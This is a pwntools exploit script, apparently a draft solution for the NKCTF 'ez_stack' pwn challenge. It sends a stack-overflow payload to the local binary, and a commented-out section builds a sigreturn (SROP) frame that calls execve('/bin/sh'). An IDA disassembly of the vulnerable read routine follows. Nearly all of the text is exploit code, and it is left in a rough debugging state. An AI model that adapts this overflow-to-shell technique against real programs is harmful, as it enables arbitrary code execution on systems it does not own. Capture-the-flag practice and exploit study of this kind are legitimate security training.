from pwn import *

p = process('./ez_stack')
elf = ELF('./ez_stack')
context.arch = 'amd64'
pop_rdi = 0x0000000000401283
payload = b'a' * 0x18 + p64(0x4011b9) * 3
p.sendline(payload)
gdb.attach(p)
pause()
p.sendline(b'\xb3')
# xor_xor_rax = 0x04004F1
# mov_rax_15_ret = 0x004004DA
# syscall_ret = 0x0400517
#
# c.send(b"/bin/sh\x00"+b"\x00"*8+ p64(xor_xor_rax))
# c.recv(32)
# stack_addr = u64(c.recv(8))
# log.success("stack: " + hex(stack_addr))
# c.recv(8)
#
# bin_sh = stack_addr - 0x148
#
# exe_frame= SigreturnFrame()
# exe_frame.rax = 59
# exe_frame.rdi = bin_sh
# exe_frame.rsi = 0
# exe_frame.rdx = 0
# exe_frame.rsp = stack_addr
# exe_frame.rip = syscall_ret
#
# payload= b'a'*0x10 + p64(mov_rax_15_ret) + p64(syscall_ret) + bytes(exe_frame)
# c.sendline(payload)
p.interactive()
"""
.text:00000000004011B9 ; __unwind {
.text:00000000004011B9                 endbr64
.text:00000000004011BD                 push    rbp
.text:00000000004011BE                 mov     rbp, rsp
.text:00000000004011C1                 mov     rax, 1
.text:00000000004011C8                 mov     rdx, 26h ; '&'  ; count
.text:00000000004011CF                 lea     rsi, nkctf      ; "Welcome to the binary world of NKCTF!\n"
.text:00000000004011D7                 mov     rdi, rax        ; fd
.text:00000000004011DA                 syscall                 ; LINUX - sys_write
.text:00000000004011DC                 xor     rax, rax
.text:00000000004011DF                 mov     rdx, 200h       ; count
.text:00000000004011E6                 lea     rsi, [rsp+buf]  ; buf
.text:00000000004011EB                 mov     rdi, rax        ; fd
.text:00000000004011EE                 syscall                 ; LINUX - sys_read
.text:00000000004011F0                 mov     eax, 0
.text:00000000004011F5                 pop     rbp
.text:00000000004011F6                 retn
.text:00000000004011F6 ; } // starts at 4011B9
.text:00000000004011F6 vuln            endp
"""
